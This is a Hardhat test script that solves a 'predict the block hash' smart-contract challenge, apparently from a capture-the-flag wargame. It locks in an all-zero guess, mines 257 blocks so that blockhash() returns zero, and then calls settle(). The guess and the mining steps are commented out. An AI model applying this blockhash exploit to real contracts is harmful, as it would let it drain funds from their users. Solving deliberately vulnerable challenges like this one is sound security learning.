import { expect } from 'chai';
import { ethers } from 'hardhat';
import { etherToWei, mineBlocks } from '../utils';

describe('PredictBlockHash', function () {
  it('should guess the block hash', async function () {
    const challengeAddress = '0x479bc2dF0884113fD346d6Cecb39F2ba432d6BfB';

    const Challenge = await ethers.getContractFactory('PredictTheBlockHash');
    const challenge = Challenge.attach(challengeAddress);

    // const answer =
    //   '0x0000000000000000000000000000000000000000000000000000000000000000';
    // const lockIsGuessTx = await challenge.lockInGuess(answer, {
    //   value: etherToWei(1),
    // });
    // await lockIsGuessTx.wait();

    /**
     * blockhash() only works for the 256 most recent blocks and will return 0x0000000000000000000000000000000000000000000000000000000000000000
     * for older blocks so we mine 257 blocks so that it will match our guess
     * If you are using a local testnet like hardhat, you can mine blocks by making simple transaction
     */
    // const blocksToMine = 257;
    // await mineBlocks(blocksToMine);

    console.log('settle');
    await challenge.settle();
    expect(await challenge.isComplete()).to.be.true;
  });
});
